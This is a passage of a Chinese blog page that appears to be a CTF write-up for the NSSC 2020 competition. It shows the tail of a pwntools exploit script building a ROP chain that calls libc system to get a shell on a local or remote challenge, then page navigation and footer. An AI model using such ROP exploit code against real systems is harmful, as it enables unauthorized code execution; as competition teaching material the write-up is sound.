class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(pop_rdi)<br>	p += p64(libc_base + <span class="hljs-number">0x18ce17</span>)<br>	p += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>	sl(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process()<br>			<span class="hljs-comment">#io = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )</span><br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2020/11/08/security/ctf/wp/wp-other/">← Next OTHER WRITE UP FOR ME</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2020/11/01/others/weekly-report/2020-11-01-%E5%91%A8%E6%8A%A5/">2020-11-01 周报 Prev →</a></div></div></div><details id="reward"><summary>打赏</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/Yue-plus">John Doe</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSC-2020-CTF-WP-2020%E5%B9%B4%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E7%AC%AC%E4%B9%9D%E5%B1%8A%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">NSSC 2020 CTF WP [2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Trials-competition"><span class="toc-number">2.</span> <span class="toc-text">Trials competition</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-Echo"><span class="toc-number">2.1.</span> <span class="toc-text">pwn1[Echo]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2-noteplus"><span class="toc-number">2.2.</span> <span class="toc-text">pwn2 [noteplus]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn3-youchat"><span class="toc-number">2.3.</span> <span class="toc-text">pwn3 [youchat]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto3-crypto-lp"><span class="toc-number">2.4.</span> <span class="toc-text">Crypto3 [crypto_lp]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Final-competition"><span class="toc-number">3.</span> <span class="toc-text">Final competition</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Individual-Jeopardy"><span class="toc-number">3.1.</span> <span class="toc-text">Individual Jeopardy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2"><span class="toc-number">3.1.1.</span> <span class="toc-text">pwn2</span></a></li></ol></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">赣ICP备19008355号</a></nobr><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><br><nobr>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'LSe7mf1XYliLqgIrc3jlqXfT-gzGzoHsz'
 , appKey: 'Fu9giJfnidkCamaW89FUpidw' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>